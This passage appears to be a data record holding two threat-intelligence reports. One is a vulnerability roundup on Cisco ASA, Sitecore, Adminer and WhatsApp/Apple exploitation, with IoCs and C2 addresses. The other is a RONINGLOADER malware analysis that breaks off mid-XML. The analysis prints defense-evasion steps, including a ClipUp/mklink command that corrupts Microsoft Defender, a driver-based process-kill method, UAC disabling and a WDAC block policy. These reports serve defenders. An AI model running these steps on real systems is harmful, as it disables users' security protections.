memory to locate the WebVPN XML element parsing table and the \u201cform\u201d element entry Overwrites the form element handler to point at the sched_getparam hook, causing processing of a form element to invoke Stage 3\u2019s deploy phase Parses the first form element of an incoming WebVPN request to verify a hard\u2011coded victim ASCII group token as the first identifier Scans XML elements for the second victim identifier (an eight\u2011byte hex token) immediately followed by the LINE VIPER shellcode stub Copies the LINE VIPER shellcode stub into the lina data area and marks that page executable via a direct mprotect system call Overwrites the form handler to point to the executable shellcode stub, causing the next processed form element to trigger shellcode execution Deletes the initial shellcode stub and adjusts handlers as required to allow LINE VIPER to stage itself and hook into VPN client authentication processing for persistent tasking Following RayInitiator Stage 3, LINE VIPER performs the following actions on a victim\u2019s device: Executes an in\u2011memory stub and XOR\u2011deobfuscates staged code using a 32\u2011byte victim key from a WebVPN xml element Deletes the transient stub and RayInitiator install artifacts, copies staged sections into a lina code cave and the .data region, and hooks lina to intercept VPN client authentication requests Verifies victim-specific tokens embedded in XML attributes before running payloads, enforcing execution on intended targets Performs an RSA-based key exchange to derive per-victim key material, stores random key sets, and returns RSA-encrypted key material in an XML message for the threat actors to use Accepts AES-CBC-256 encrypted tasking over HTTPS WebVPN using the derived keys and returns AES-encrypted responses inside XML message elements Supports an Internet Control Message Protocol (ICMP) tasking method tunneled over the VPN for requests and sends exfiltration via raw transmission control protocol (TCP) from the ASA WAN interface to threat actor VPN IP addresses on high ephemeral ports Executes modular payloads to run command-line interface (CLI) commands, perform hidden packet captures (RADIUS, LDAP, TACACS), bypass Authentication, Authorization, and Accounting (AAA) for threat actor devices using a device\u2011ID table, harvest user CLI commands, and schedule delayed reboots Hides activity by suppressing specific syslog entries, temporarily changing memory permissions to avoid artifacts, altering core\u2011dump handling to force reboots, and returning legitimate hashes to conceal tampering Exfiltrates collected data either inside encrypted WebVPN XML responses or via the ICMP to raw-TCP channel using a lina proxy process that constructs TCP connections and streams data to threat actors\u2019 addresses NCSC identifies RayInitiator and LINE VIPER as an evolution of LINE DANCER and LINE RUNNER from the April 2024 ArcaneDoor campaign due to their shared use of victim-specific tokens, targeting of legacy Cisco ASA devices, abuse of WebVPN authentication traffic for shellcode delivery, and modular shellcode architecture. Cisco and CISA provided the following mitigations and remediation to counter persistent exploitation of CVE-2025-20333 and CVE-2025-20362 and the infection of RayInitiator and LINE VIPER malware: Apply Cisco security updates released for CVE-2025-20333 and CVE-2025-20362 Disconnect unsupported ASA devices reaching end-of-support Collect and submit core dumps from all public-facing ASA devices to CISA Verify ROMMON integrity on ASA 5500-X without Secure Boot and rebuild or reset compromised devices following Cisco eviction guidance Restrict VPN and WebVPN management interfaces and monitor for indicators of compromise (IoCs), including abnormal XML tokens, suppressed logs, and unusual outbound traffic Additionally, Cisco released a fix for CVE-2025-20363, a related heap-based buffer overflow vulnerability that could allow remote, unauthenticated attackers to execute arbitrary code (RCE) as root. At the time of writing, there is no evidence of in-the-wild exploitation of CVE-2025-20363. Insikt-Validated TTP: Using Nuclei to Detect CVE-2025-53690, an Actively Exploited Deserialization of Untrusted Data Vulnerability in Sitecore On September 3, 2025, cybersecurity firm Mandiant published an analysis of an active exploitation of a ViewState deserialization vulnerability, tracked as CVE-2025-53690, in Sitecore deployments. CVE-2025-53690 is a deserialization of untrusted data vulnerability affecting Sitecore Experience Manager (XM), Experience Platform (XP), and Experience Commerce (XC). In this incident, the affected deployments had retained a sample machine key that had been exposed in Sitecore deployment guides (from 2017 and earlier). The threat actors leveraged this exposed machine key to execute arbitrary code (RCE). They achieved initial access by targeting /sitecore/blocked.aspx , a legitimately reachable page that accepts ViewState. POST requests to this endpoint coincided with ASP.NET Application log Event ID 1316 ( ViewState verification failed ), consistent with signed/encrypted ViewState being forged via the exposed machine key. A decrypted payload contained an embedded .NET assembly named Information.dll (tracked as WEEPSTEEL), which enumerates host, disk, network adapter, and process information and returns results disguised as a benign __VIEWSTATE value. Following code execution with NETWORK SERVICE privileges (equivalent to the IIS process w3wp.exe ), the threat actors archived the Sitecore Content Delivery web root ( \\inetpub\\sitecore\\SitecoreCD\\Website ) to collect sensitive configuration files (for example, web.config ), then staged tooling under public user directories (for example, C:\\Users\\Public\\Music ). The threat actors deployed EARTHWORM to establish reverse SOCKS tunnels to command-and-control (C2) servers at 130[.]33[.]156[.]194[:]443 and 103[.]235[.]46[.]102[:]80 ; installed DWAgent as a SYSTEM service for persistent remote access and Active Directory (AD) reconnaissance; executed SharpHound (saved as sh.exe ) to map Active Directory; and used GoToken.exe , which Mandiant links with a public token-stealing tool GoTokenTheft. Additionally, a launcher script ( 1.vbs ) was used to start EARTHWORM, and 7za.exe (a command-line executable for the 7-Zip file archiver) was employed to archive collection output for exfiltration. For privilege escalation and credential access, the threat actors created local administrator accounts ( asp$ and sawadmin ), dumped SAM and SYSTEM registry hives, attempted token theft, and disabled password expiration on targeted administrator accounts. asp$ was created by executing helper.exe wrapping net user/net localgroup commands; sawadmin was created during a DWAgent session. Lateral movement relied heavily on remote desktop protocol (RDP) pivoting through the EARTHWORM tunnel, with additional AD discovery (for example, nltest /DCLIST and findstr searches for cpassword in SYSVOL ). During one RDP session under asp$ , the threat actors downloaded dwagent.exe and main.exe into C:\\Users\\asp$\\Downloads . After establishing access to the compromised admin accounts, the previously created local accounts were removed. Recorded Future\u2019s Insikt Group\u00ae created a Nuclei template, which is available to Recorded Future customers, to detect CVE-2025-53690. The template sends a GET request to the /sitecore/shell/sitecore.version.xml endpoint, verifies that the HTTP status code is 200, and checks whether the response body contains <major> and <minor> tags indicating a major version of 0-8 or exactly 9.0 (major 9 with minor 0). If confirmed, it extracts the Sitecore major and minor numbers from the XML body using regex and formats them into a normalized string ( Sitecore Version: X.Y ). If the XML is unavailable, the template performs a fallback GET request to /sitecore/login , verifies that the status code is 200, and checks for the login banner text matching Sitecore.NET x.y for versions 0-8.x or 9.0. This template fingerprints two Sitecore endpoints and flags instances reporting versions before or equal to 8.x, or exactly 9.0, ranges historically associated with deployment guides that included a sample ASP.NET <machineKey> . It does not verify whether a static or compromised <machineKey> is present, nor whether a ViewState endpoint is reachable. Exploitability for CVE-2025-53690 depends on the use (or compromise) of a static machine key, not the version alone. This template performs non-invasive fingerprinting by issuing two GET requests to the Sitecore version and login endpoints and evaluating their response. It verifies the presence of identified keywords in the body, confirms 200 status codes, and extracts version strings using regex. No payloads are sent, no authentication is attempted, and no system state is modified (no file writes, configuration changes, or persistence). Expected observables are limited to a routine HTTP GET request recorded in access logs. This Nuclei template is intended for use in authorized environments only. Sitecore recommends customers who deployed XM, XP, or XC with the sample ASP.NET machine key from legacy guidance (XP 9.0 or earlier and Active Directory 1.4 or earlier) to immediately: Examine their environments for suspicious or anomalous activity Rotate the machine keys defined in web.config Ensure any <machineKey> elements in web.config are encrypted Restrict web.config access to application administrators only Adopt timely, recurring rotation of static machine keys For configurations that require static machine keys, Sitecore recommends that customers follow its machine-key rotation procedure as a best practice and to rotate keys if compromise is suspected. Additionally, Mandiant also recommends hardening ASP.NET itself by enabling ViewState Message Authentication Code (MAC), moving to automatic per-app machine-key rotation, and encrypting other plaintext secrets in web.config beyond the <machineKey> element. Additionally, Mandiant provided the following indicators of compromise (IoCs): asp$ (created account) Sawadmin (created account) H496883 (workstation from the RDP connection) 1.vbs (EARTHWORM loader) SHA-256: a566cceaf9a66332470a978a234a8a8e2bbdd4d6aa43c2c75c25a80b3b744307 (WEEPSTEEL; Information.dll ) SHA-256: b3f83721f24f7ee5eb19f24747b7668ff96da7dfd9be947e6e24a688ecc0a52b (EARTHWORM; lfe.ico , ufp.exe , and ufp.ico ) SHA-256: 61f897ed69646e0509f6802fb2d7c5e88c3e3b93c4ca86942e24d203aa878863 (SharpHound) SHA-256: 223b873c50380fe9a39f1a22b6abf8d46db506e1c08d08312902f6f3cd1f7ac3 (executable for 7-Zip archiver) MD5: f410d88429b93786b224e489c960bf5c ( Helper.ico and helper.exe ) MD5: be7e2c6a9a4654b51a16f8b10a2be175 ( main.exe file downloaded from hxxp://130[.]33[.]156[.]194/main.exe ) MD5: 62483e732553c8ba051b792949f3c6d0 ( GoToken.exe ) 130[.]33[.]156[.]194[:]443 (C2 server 130[.]33[.]156[.]194[:]8080 (unspecified, likely C2 server) 103[.]235[.]46[.]102[:]80 (C2 server) At the time of writing, there were 330 exposed Sitecore instances on Shodan, most of which were geolocated in the United States (US), followed by Australia, the United Arab Emirates (UAE), South Africa, and the United Kingdom (UK). However, not all of these are necessarily vulnerable, since Shodan does not reveal the specific version strings that can be extracted through targeted requests. Figure 2: Vulnerability Intelligence Card\u00ae for CVE-2025-53690 in Recorded Future (Source: Recorded Future) Insikt-Validated TTP: Using Nuclei to Detect CVE-2021-21311, an Actively Exploited Server-Side Request Forgery Vulnerability in Adminer On September 29, 2025, the US Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2021-21311 to its Known Exploited Vulnerabilities (KEV) catalog. CVE-2021-21311 is a high-severity server-side request forgery (SSRF) vulnerability in Adminer versions 4.0.0 through 4.7.8, affecting users of Adminer bundling all drivers (for example, adminer.php ). Users should therefore upgrade to version 4.7.9. Adminer is an open-source database management tool that natively supports Structured Query Language (SQL) database systems (for example, MySQL, PostgreSQL, SQLite, MS SQL, MariaDB, and Oracle) and can be extended via plugins to support systems like Elasticsearch and MongoDB. CVE-2021-21311 enables SSRF via Adminer\u2019s HTTP-based drivers, allowing a remote unauthenticated attacker to coerce the application into issuing arbitrary HTTP GET requests to internal endpoints and echoing the response body in the user interface. Security researchers demonstrated a proof-of-concept that starts a simple Python HTTP server that replies with a 301 redirect to an AWS Instance Metadata Service (IMDS) endpoint; when Adminer \u201clogs in\u201d to the attacker-controlled server using the Elasticsearch module, it follows the redirect and prints the IMDS response, confirming access to metadata and enabling retrieval of sensitive information such as AWS access keys. Successfully exploiting the vulnerability can therefore expose sensitive information, enable access to internal resources, and in environments where internal HTTP services are reachable (for example, Elasticsearch/ClickHouse application programming interfaces [APIs]), permit data modification or unauthorized administrative actions. An attacker can also automate SSRF to probe and enumerate internal services; in cloud deployments, any exfiltrated credentials inherit the permissions of the instance profile, enabling lateral movement or escalation consistent with that role. Recorded Future\u2019s Insikt Group\u00ae created a Nuclei template, which is available to Recorded Future customers, to detect CVE-2021-21311. The template sends a POST request to common Adminer paths (for example, /adminer.php and /index.php ), setting auth[driver]=elastic and auth[server]=example.com with placeholder credentials (username and database default to test ). This prompts vulnerable builds to attempt an outbound fetch and surface an error page. A target is flagged when the HTTP status is 200, 400, or 403 and the response body contains a 400 - Bad Request title (raw or HTML-escaped), indicating Adminer displayed a 400 error page during the external fetch attempt. On patched Adminer versions (4.7.9 and later), non-200 response bodies are not printed (see commit ccd2374 ). This template performs a non-intrusive SSRF check against Adminer by sending a crafted POST request to a small set of common Adminer paths. No authentication is attempted, no database content is modified, and no system state is altered (for example, no file writes, configuration changes, or persistence). Expected observables are limited to a small number of HTTP POST requests recorded in access logs and an HTML response containing a 400 - Bad Request title (consistent with the external fetch attempt outlined above). An outbound HTTP request from the target toward example.com may also be visible in egress logs. This Nuclei template is intended for use in authorized environments only. At the time of writing, there were 9,651 exposed Adminer instances on Shodan , most of which are geolocated in Germany, the US, Russia, France, and Singapore. However, not all of these are necessarily vulnerable, as their specific versions are unknown. Attack Chain Scenario for WhatsApp Zero-Click (CVE-2025-55177) and Apple OOB Write (CVE-2025-43300) Vulnerabilities Published On August 30, 2025, security researcher Vaibhav Kanada published a technical blog detailing an attack chain scenario for CVE-2025-55177 and CVE-2025-43300. CVE-2025-55177 is a zero-click authorization bypass vulnerability in WhatsApp\u2019s linked-device synchronization feature, affecting WhatsApp for iOS versions before 2.25.21.73, WhatsApp Business for iOS versions prior to 2.25.21.78, and WhatsApp for Mac versions prior to 2.25.21.78. CVE-2025-43300 is an out\u2011of\u2011bounds (OOB) write vulnerability in Apple\u2019s ImageIO framework, affecting iOS, iPadOS, and macOS versions before iOS 18.6.2, iPadOS 18.6.2, and macOS Sequoia 15.6.1. CVE-2025-55177 allows threat actors to deliver crafted synchronization messages containing malicious URLs, forcing vulnerable devices to download and process untrusted online content. When combined with CVE-2025-43300, threat actors can escalate privileges and compromise targeted iOS, iPadOS, and macOS systems. On August 20, 2025, WhatsApp released client updates to fix CVE-2025-55177, and Apple released iOS 18.6.2, iPadOS 18.6.2, and macOS Sequoia 15.6.1 to patch CVE-2025-43300. Additionally, WhatsApp stated that CVE-2025-55177 and CVE-2025-43300 may have been exploited in the wild against targeted users before the release of the patches. On August 20, 2025, CISA added CVE-2025-43300 to its KEV catalog, and added CVE-2025-55177 on September 2, 2025. CVE-2025-55177 stems from the incomplete authorization in WhatsApp\u2019s linked-device synchronization feature. This feature authenticates and synchronizes messages and activity between a user\u2019s primary device and linked companion devices, ensuring that devices paired by the user can securely exchange and process synchronization messages. However, WhatsApp fails to enforce proper authorization checks, which allows unauthorized devices to send crafted synchronization messages that force the victim\u2019s client to process malicious remote content. CVE-2025-43300 stems from insufficient bounds checking in Apple\u2019s ImageIO framework. This framework parses and renders common image formats, such as JPEG and TIFF, to display media across iOS, iPadOS, and macOS. However, ImageIO fails to properly validate image metadata structures, which allows crafted files to trigger OOB writes that corrupt memory and enable threat actors to execute arbitrary code with elevated privileges. Kanada provided the following attack chain scenario for the exploitation of CVE-2025-55177 and CVE-2025-43300: The threat actor exploits CVE-2025-55177 by sending a malicious synchronization message with a crafted URL to the target\u2019s linked device. The victim\u2019s WhatsApp client processes the remote content without proper authorization and executes malicious payloads hosted on threat actor-controlled infrastructure. If the payload contains a malicious image exploiting CVE-2025-43300, it runs with escalated privileges and bypasses Apple\u2019s security mechanisms. The threat actor installs persistent malware, exfiltrates data, or further compromises the device with escalated privileges. This attack chain scenario demonstrates a critical exploitation path combining application-level authorization bypass with kernel-level privilege escalation. Figure 3: Vulnerability Intelligence Card\u00ae for CVE-2025-43300 in Recorded Future (Source: Recorded Future) Prominent Vulnerability Disclosures from September 2025 Recorded Future Risk Scores range from \u201cNone\u201d (0) to \u201cVery Critical\u201d (90-99) and can change with new analytics and sources. Insikt Group identified 1,096 vulnerabilities disclosed in September with Risk Scores of 65 or above (High to Very Critical). The table below lists the sixteen vulnerabilities that were actively exploited in September based on Recorded Future\u00ae data. The table below also provides examples of public PoCs identified by Insikt Group. These PoCs were not tested for accuracy or efficacy. Vulnerability management teams should exercise caution and verify the validity of PoCs before testing. # Vulnerability Risk Score Affected Vendor/Product Vulnerability Type/Component Public PoC 1 CVE-2025-32463 99 Sudo CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) Yes 2 CVE-2025-59689 99 Libraesva Email Security Gateway CWE-77 (Command Injection) No 3 CVE-2025-10035 99 Fortra GoAnywhere MFT CWE-502 (Deserialization of Untrusted Data); CWE-77 (Command Injection) Yes 4 CVE-2025-20352 99 Cisco IOS and IOS XE CWE-121 (Stack-Based Buffer Overflow) Yes 5 CVE-2021-21311 99 Adminer CWE-918 (Server-Side Request Forgery) Yes 6 CVE-2025-20362 99 Cisco Secure Firewall Adaptive Security Appliance and Secure Firewall Threat Defense CWE-862 (Missing Authorization) No 7 CVE-2025-20333 99 Cisco Secure Firewall Adaptive Security Appliance and Secure Firewall Threat Defense CWE-120 (Classic Buffer Overflow) No 8 CVE-2025-10585 99 Google Chromium V8 CWE-843 (Type Confusion) No 9 CVE-2025-5086 99 Dassault Syst\u00e8mes DELMIA Apriso CWE-502 (Deserialization of Untrusted Data) Yes 10 CVE-2025-38352 89 Linux Kernel CWE-367 (Time-of-Check Time-of-Use Race Condition) No 11 CVE-2025-48543 99 Android Runtime CWE-416 (Use-After-Free) Yes 12 CVE-2025-53690 99 Sitecore Experience Manager (XM), Experience Platform (XP), and Experience Commerce (XC) CWE-502 (Deserialization of Untrusted Data) No 13 CVE-2023-50224 89 TP-Link TL-WR841N CWE-290 (Authentication Bypass by Spoofing) No 14 CVE-2025-9377 89 TP-Link Multiple Routers CWE-78 (OS Command Injection) No 15 CVE-2020-24363 89 TP-Link TL-WA855RE CWE-306 (Missing Authentication for Critical Function) No 16 CVE-2025-55177 89 Meta Platforms WhatsApp CWE-863 (Incorrect Authorization) No Table 1: List of vulnerabilities that were actively exploited in September based on Recorded Future data. How Recorded Future reduces risk from CVEs Timely and relevant information on vulnerabilities in your environment and that of your vendors and suppliers is critical for reducing risk. Find out how Recorded Future can support your team by increasing visibility, improving efficiency, and enabling confident decisions. Vulnerability Intelligence \u2013 Prioritize vulnerabilities based on the likelihood of exploitation \u2013 not just the severity. Easily understand the risk of exploitation alongside severity, and real-time contextualized intelligence to help you quickly make confident decisions, patch what matters, and prevent attacks. Attack Surface Intelligence \u2013 Identify internet-facing assets vulnerable to a specific CVE. Attack Surface Intelligence provides an outside-in view of your organization to help you actively discover, prioritize, and respond to unknown, vulnerable, or misconfigured assets. Figure 4: Signature for CVE-2025-53690 in Recorded Future Attack Surface Intelligence \u00ae (Source: Recorded Future) Third-Party Intelligence \u2013 Gain an external view of the security posture of your vendors and partners. Eliminate time-consuming research and vendor communication cycles with the ability to promptly assess vulnerabilities in their internet-facing systems. Insikt Group \u2013 Receive access to exclusive reports on new vulnerabilities and trends from Recorded Future\u2019s team of experts, the Insikt Group. Download Nuclei templates created by Insikt Group for select CVEs to test potentially vulnerable instances. Recorded Future Professional Services \u2013 Work with our Professional Services team on a Vulnerability Analysis Engagement. Designed to equip your team with advanced strategies for identifying, prioritizing, and mitigating threats effectively, this program delves into technologies and operations essential for a successful vulnerability management program. (Learn more about how our Professional Services team can help your elevate your team by watching our recent Vulnerability Prioritization Workshop ) About Insikt Group\u00ae: Recorded Future\u2019s Insikt Group, the company\u2019s threat research division, comprises analysts and security researchers with deep government, law enforcement, military, and intelligence agency experience. Their mission is to produce intelligence that reduces risk for customers, enables tangible outcomes, and prevents business disruption.",
    "expected_count": 1
  },
  {
    "url": "https://www.elastic.co/security-labs/roningloader",
    "title": "RONINGLOADER: DragonBreath\u2019s New Path to PPL Abuse \u2014 Elastic Security Labs",
    "content": "RONINGLOADER: DragonBreath\u2019s New Path to PPL Abuse \u2014 Elastic Security Labs Explore Elastic: elastic.co Search Labs Observability Labs About Research Product Updates Reports Enablement Subscribe Start free trial Contact sales Open navigation menu 15 November 2025 \u2022 Jia Yu Chan \u2022 Salim Bitam RONINGLOADER: DragonBreath\u2019s New Path to PPL Abuse Elastic Security Labs uncovers RONINGLOADER, a multi-stage loader deploying DragonBreath\u2019s updated gh0st RAT variant. The campaign weaponizes signed drivers, thread-pool injection, and PPL abuse to disable Defender and evade Chinese EDR tools. 24 min read Malware Analysis Introduction Elastic Security Labs identified a recent campaign distributing a modified variant of the gh0st RAT, attributed to the Dragon Breath APT (APT-Q-27), through trojanized NSIS installers masquerading as legitimate software such as Google Chrome and Microsoft Teams. The infection chain employs a multi-stage delivery mechanism that leverages various evasion techniques, with many redundancies aimed at neutralising endpoint security products popular in the Chinese market. These include bringing a legitimately signed driver, deploying custom WDAC policies, and tampering with the Microsoft Defender binary through PPL abuse. This campaign primarily targets Chinese-speaking users and demonstrates a clear evolution in adaptability compared to earlier DragonBreath-related campaigns documented in 2022-2023. Through this report, we hope to raise awareness of new techniques this malware is starting to implement and to shine a light on a unique loader we are naming RoningLoader. Key takeaways The malware employs an abuse of Protected Process Light (PPL) to disable Windows Defender Threat actors leverage a valid, signed kernel driver to kill processes Custom unsigned WDAC policy applied to block 360 Total Security and Huorong executables Phantom DLLs and payload injection via thread pools for further antivirus process termination Final payload has minor updates and is associated with DragonBreath Discovery In August 2025, research was published detailing a method to abuse Protected Process Light (PPL) to disable endpoint security tooling. Following this disclosure, we produced a behavioral rule, Potential Evasion via ClipUp Execution , and, after some threat hunting of telemetry data, we identified a live campaign employing the technique. RONINGLOADER code analysis The initial infection vector is a Windows Installer package (MSI). Upon execution, the MSI functions as a dropper, extracting two embedded Nullsoft Scriptable Install System (NSIS) installers. NSIS is a legitimate, open-source tool for creating Windows installers, but it is frequently abused by threat actors to package and deliver malware, as seen in GULOADER . In this campaign, we have observed the malicious installers being distributed under various themes, masquerading as legitimate software such as Google Chrome, Microsoft Teams, or other trusted applications to lure users into executing them. One of the nested NSIS installers is benign and installs the legitimate software, while the second is malicious and responsible for deploying the attack chain. The attack chain leverages a signed driver named ollama.sys for antivirus process termination. The driver has a signer name of Kunming Wuqi E-commerce Co., Ltd. , with a certificate valid from February 3, 2025, to February 3, 2026. Pivoting on VirusTotal revealed 71 additional signed binaries. Among these, we identified AgentTesla droppers masquerading as \u6155\u8baf\u516c\u76ca\u52a0\u901f\u5668 (MuXunAccelerator) , a gaming-focused VPN software popular among Chinese users, with samples dating back to April 2025. Notably, the signing techniques vary across samples. Some earlier samples, like inject.sys , contain HookSignTool artifacts including the string JemmyLoveJenny , while the October 2025 ollama.sys sample shows no such artifacts and uses standard signing procedures, yet both share the same certificate validity period. Comparing ollama.sys \u2019s PDB string artifact D:\\VS_Project\\\u52a0\u89e3\u5bc6\\MyDriver1\\x64\\Release\\MyDriver1.pdb with other samples, we discovered different artifacts from other submitted samples - D:\\cpp\\origin\\ConsoleApplication2\\x64\\Release\\ConsoleApplication2.pdb D:\\a_work\\1\\s\\artifacts\\obj\\coreclr\\windows.x86.Release\\Corehost.Static\\singlefilehost.pdb C:\\Users\\0\\Desktop\\EAMap\\x64\\Release\\ttt.pdb h:\\projects\\netfilter3\\bin\\Release\\Win32\\nfregdrv.pdb Due to the diversity of binaries and the large volume of submissions, we suspect the certificate may have been leaked, but this is speculation at this time. Stage 1 Our analysis began with the initial binary, identified by its SHA256 hash: da2c58308e860e57df4c46465fd1cfc68d41e8699b4871e9a9be3c434283d50b . Extracting it reveals two embedded executables: a benign installer, letsvpnlatest.exe , and the malicious installer Snieoatwtregoable.exe . The malicious installer, Snieoatwtregoable.exe , creates a new directory at C:\\Program Files\\Snieoatwtregoable\\ . Within this folder, it drops two files: a DLL named Snieoatwtregoable.dll and an encrypted file, tp.png . The core of the malicious activity resides within Snieoatwtregoable.dll , which exports a single function: DllRegisterServer . When invoked, this function reads the contents of the tp.png file from disk, then decrypts this data using a simple algorithm involving both a Right Rotate (ROR) and an XOR operation. The decrypted content is shellcode that reflectively loads and executes a PE file in memory. The malware first allocates a new memory region within its own process using the NtAllocateVirtualMemory API, then creates a new thread to execute the shellcode by calling NtCreateThreadEx . The malware attempts to remove any userland hooks by loading a fresh new ntdll.dll , then using GetProcAddress with the API name to resolve the addresses. The malware attempts to connect to localhost on port 5555 without serving any real purpose, as the result will not matter; speculatively, this is likely dead code or pre-production leftover code Stage 2 - tp.png RONINGLOADER first checks whether it has administrative privileges using the GetTokenInformation API. If not, it attempts to elevate its privileges by using the runas command to launch a new, elevated instance of itself before terminating the original process. Interestingly, the malware tries to communicate with a hardcoded URL http://www.baidu.com/ with the user-agent \u201cMozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\u201d , but this appears to be dead code, likely due to either a removed feature or placeholder code for future versions. It is designed to extract and log the HTTP response header date from the URL. The malware then scans a list of running processes for specific antivirus solutions. It checks against a hardcoded list of process names and sets a corresponding boolean flag to \"True\" if any are found. The following is a table of processes and the associated security products hardcoded in the binary: Process name Security Product MsMpEng.exe Microsoft Defender Antivirus kxemain.exe Kingsoft Internet Security kxetray.exe Kingsoft Internet Security kxecenter.exe Kingsoft Internet Security QQPCTray.exe Tencent PC Manager QQPCRTP.exe Tencent PC Manager QMToolWidget.exe Tencent PC Manager HipsTray.exe Qihoo 360 Total Security HipsDaemon.exe Qihoo 360 Total Security HipsMain.exe Qihoo 360 Total Security 360tray.exe Qihoo 360 Total Security AV process termination via injected remote process Next, the malware kills those processes. Interestingly, the Qihoo 360 Total Security product takes a different approach than the others. First, it blocks all network communication by changing the firewall. It then calls a function to inject shellcode into the process ( vssvc.exe ) associated with the Volume Shadow Copy (VSS) service. It first grants itself the high integrity SeDebugPrivilege token. It then starts the VSS (Volume Shadow Copy Service) if it is not already running and fetches the PID of its associated process (vssvc.exe). Next, the malware uses NtCreateSection to create two separate memory sections. It then maps views of these sections into the memory space of the vssvc.exe process. The first section contains a full Portable Executable (PE) file, which is a driver with the device name \\\\.\\Ollama . The second section contains shellcode intended for execution. RONINGLOADER takes a different approach to this process injection compared to other injection methods used elsewhere in the malware. This technique leverages the thread pool to remotely execute code via a file write trigger in the remote process. This technique was documented by SafeBreach in 2023 with different variants. Once executed, the shellcode begins by dynamically resolving the addresses of the Windows APIs it needs to function. This is the only part of RONINGLOADER that employs any obfuscation, using the Fowler\u2013Noll\u2013Vo hash (FNV) algorithm to look up functions by hash instead of by name. It first fetches the addresses of CreateFileW , WriteFile , and CloseHandle to write the driver to disk to a hardcoded path, C:\\windows\\system32\\drivers\\1912763.temp . Then it performs the following operations: Create a service named xererre1 to load the driver dropped to disk For each of the following processes ( 360Safe.exe , 360Tray.exe , and ZhuDongFangYu.exe ), which are all associated with Qihoo 360 software, it calls 2 functions: one to find the PID of the process by name, followed by a function to kill the process by PID It then stops and deletes the service xererre1 To kill a process, the malware uses the driver. An analysis of the driver reveals that it registers only 1 functionality: it handles one IOCTL ID ( 0x222000 ) that takes a PID as a parameter and kills the process by first opening it with ZwOpenProcess , then terminating it with ZwTerminateProcess kernel APIs. AV process termination Returning to the main execution flow, the malware enters a loop to confirm the termination of 360tray.exe , as handled by the shellcode injected into the VSS service. It proceeds only after verifying that the process is no longer running. Immediately after this confirmation, the system restores its firewall settings. This action is likely a defensive measure intended to sever the software's communication channel, preventing it from uploading final activity logs or security alerts to its backend services. It then terminates the other security processes directly from its main process. Notably, it makes no attempt to hide these actions, abandoning the earlier API hashing technique and calling the necessary functions directly. RONINGLOADER follows a consistent, repeatable procedure to terminate its target processes: First, it writes the malicious driver to disk, this time to the temporary path C:\\Users\\analysis\\AppData\\Local\\Temp\\ollama.sys. A temporary service ( ollama ) is created to load ollama.sys into the kernel The malware then fetches the target process's PID by name and sends a request containing the PID to its driver to perform the termination. Immediately after the kill command is sent, the service is deleted. Regarding Microsoft Defender, the malware attempts to kill the MsMpEng.exe process using the same approach described above. We noticed a code bug from the author: for Microsoft Defender, the code does not check whether Defender is already running, but proceeds directly to searching for the MsMpEng.exe process. This means that if the process is not running, the malware will send 0 as the PID to the driver. The malware has more redundant code to kill security solution processes. It also injects another shellcode into svchost.exe, similar to what was injected into vssvc.exe , but the list of processes is different, as seen in the screenshot below. The injection technique also uses threadpools, but the injected code is triggered by an event. After the process termination, the malware creates 4 folders C:\\ProgramData\\lnk C:\\ProgramData\\<current_date> C:\\Users\\Public\\Downloads\\<current_date> C:\\ProgramData\\Roning Embedded archives The malware then writes three .txt files to C:\\Users\\Public\\Downloads\\<current_date> . Despite their extension, these are not text files but rather containers built with a specific format, likely adapted from another code base. This custom file structure is organized as follows: Magic Bytes: The file begins with the signature 4B 44 01 00 for identification. File Count: This is immediately followed by a value indicating the number of files encapsulated within the container. File Metadata: A header section then describes the information for each stored file. Compressed Data: Finally, each embedded file is stored in a ZLIB-compressed data block. Here\u2019s an example file format for the hjk.txt archive , which contains 2 files: 1.bat and fhq.bat . This archive format applies to 2 other embedded files in the current stage: agg.txt , which contains 3 files - Enpug.bin , goldendays.dll , and trustinstaller.bin kill.txt , which contains 1 file - 1.dll Batch scripts to bypass UAC and AV networking 1.bat is a simple batch script that disables User Account Control (UAC) by setting the EnableLUA registry value to 0. fhq.bat is another batch script that targets the program defined in C:\\ProgramData\\lnk\\123.txt and the Qihoo 360 security software (360Safe.exe) by creating firewall rules that block inbound and outbound connections to them. It also disables firewall notifications across all profiles. AV process termination via Phantom DLL The deployed DLL, 1.dll , is copied to C:\\Windows\\System32\\Wow64\\Wow64Log.dll to be side-loaded by any WOW64 processes, as Wow64Log.dll is a phantom DLL that is not present on Windows machines by default. Its task is redundant, essentially attempting to kill a list of processes using standard Windows APIs ( TerminateProcess ). ClipUp MS Defender killer The malware then attempts to use a PPL abuse technique documented by Zero Salarium in August 2025. The article\u2019s PoC targets Microsoft Defender only. Note that all of the system commands executed are through cmd.exe with the ShellExecuteW API It searches for Microsoft Defender's installation folder under C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\* , targeting only the directory with the most recent modification date, which indicates the currently used version Create a folder C:\\ProgramData\\roming and a directory link with mklink to point to the directory found with the following command: cmd.exe /c mklink /D \"C:\\ProgramData\\roming\" \u201cC:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0\u201d It then runs C:\\Windows\\System32\\ClipUp.exe with the following parameter: -ppl C:\\ProgramData\\roming\\MsMpEng.exe , which overwrites MsMpEng.exe with junk data, effectively disabling the EDR even after a restart The author appears to have copied code from EDR-Freeze to start ClipUp.exe . CiPolicies The malware directly targets Windows Defender Application Control (WDAC) by writing a policy file to the path C:\\\\Windows\\\\System32\\\\CodeIntegrity\\\\CiPolicies\\\\Active\\\\{31351756-3F24-4963-8380-4E7602335AAE}.cip . The malicious policy operates in a \u201cdeny-list\u201d mode, allowing most applications to run while explicitly blocking two popular Chinese antivirus vendors: Qihoo 360 Total Security by blocking 360rp.exe and 360sd.exe Huorong Security by blocking ARPProte.exe All executables signed by Huorong Security ( \u5317\u4eac\u706b\u7ed2\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8 ) via certificate TBS hash A229D2722BC6091D73B1D979B81088C977CB028A6F7CBF264BB81D5CC8F099F87D7C296E48BF09D7EBE275F5498661A4 A critical component is the Enabled:Unsigned System Integrity Policy rule, which allows the policy to be loaded without a valid digital signature. Truncated... <Rule> <Option>Enabled:Inherit Default Policy</Option> </Rule> <Rule> <Option>Enabled:Unsigned System Integrity Policy</Option> </Rule> <Rule> <Option>Enabled:Advanced Boot Options Menu</Option> </Rule> <Rule> <Option>Enabled:Update Policy No Reboot</Option> </Rule> </Rules> <EKUs /> <FileRules> <Allow 